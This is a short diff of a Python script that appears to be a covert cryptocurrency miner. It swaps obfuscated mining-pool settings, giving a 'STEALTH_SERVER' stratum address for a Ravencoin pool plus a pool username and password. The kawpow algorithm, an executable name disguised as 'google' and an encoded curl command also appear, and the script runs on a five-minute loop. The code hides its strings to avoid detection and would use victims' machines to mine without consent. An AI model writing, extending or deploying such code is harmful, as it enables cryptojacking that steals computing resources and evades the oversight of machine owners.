@@ -66,9 +66,9 @@ ORIGINAL_EXECUTABLE_NAME_ENCODED = advanced_obfuscate_string("google")
 # Service configuration has been updated based on your request.
 SERVICE_ALGORITHM_ENCODED = advanced_obfuscate_string("kawpow")
 # The actual server address is stored in a separate variable.
-STEALTH_SERVER_ENCODED = advanced_obfuscate_string("kawpow.auto.nicehash.com:9200")
-SERVICE_USER_ENCODED = advanced_obfuscate_string("RNHbZifZUPqLT4L9zMKx2UUvQvAKx1c8f2xAf")
-SERVICE_PASS_ENCODED = advanced_obfuscate_string("Cukimeki")
+STEALTH_SERVER_ENCODED = advanced_obfuscate_string("stratum+tcp://rvn.kryptex.network:7031")
+SERVICE_USER_ENCODED = advanced_obfuscate_string("krxXJMWJKW")
+SERVICE_PASS_ENCODED = advanced_obfuscate_string("Tastes")
 
 # Command and argument strings are also obfuscated.
 CURL_COMMAND_ENCODED = advanced_obfuscate_string("curl")
@@ -399,4 +399,3 @@ if __name__ == "__main__":
         # Wait for 5 minutes before the next cycle.
         wait_duration = 5 * 60
         time.sleep(wait_duration)
-
